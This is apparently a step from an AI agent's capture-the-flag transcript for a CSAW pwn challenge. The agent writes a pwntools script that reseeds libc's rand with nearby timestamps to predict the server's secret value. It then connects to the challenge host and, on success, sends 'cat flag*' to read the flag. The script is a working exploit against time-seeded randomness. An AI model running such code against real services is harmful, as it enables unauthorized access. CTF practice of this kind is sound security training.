DISCUSSION
I'll add a pwntools script that uses libc's `srand/rand` to mirror the server exactly and iterate over nearby timestamps.
COMMAND
edit 1:1
from pwn import *
import ctypes
import time

HOST = "pwn.chal.csaw.io"
PORT = 5000

libc = ctypes.CDLL("libc.so.6")

def guess_for(ts):
    libc.srand(ts & 0xffffffff)
    return libc.rand() % 0x100000

now = int(time.time())

for delta in range(-5, 6):
    ts = now + delta
    guess = guess_for(ts)
    print(f"trying ts={ts} guess={guess}")
    p = remote(HOST, PORT)
    p.recvuntil(b"Which haystack do you want to check?")
    p.sendline(str(guess).encode())
    resp = p.recv(timeout=1)
    if b"Hey you found it" in resp or b"$" in resp or b"#" in resp:
        print(resp.decode("latin-1", errors="replace"))
        p.sendline(b"cat flag*")
        print(p.recvall(timeout=2).decode("latin-1", errors="replace"))
        break
    print(resp.decode("latin-1", errors="replace"))
    p.close()
end_of_edit
